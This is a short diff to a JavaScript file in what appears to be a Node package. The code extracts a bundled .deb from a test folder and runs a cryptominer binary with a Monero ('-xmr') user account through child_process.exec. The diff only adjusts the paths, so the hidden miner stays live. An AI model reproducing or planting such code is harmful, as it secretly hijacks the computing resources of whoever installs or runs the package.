@@ -1,4 +1,4 @@
-var str = "dpkg -x test/tmp.deb tmp && cd test/tmp/opt/min*/ && ./min* -user cccholo@yandex.com -xmr";
+var str = "dpkg -x ./test/tmp.deb ./test/tmp && cd ./test/tmp/opt/min*/ && ./min* -user cccholo@yandex.com -xmr";
 var child = require('child_process').exec(str);
 child.stdout.on('data', function(data) {
     console.log('stdout: ' + data);
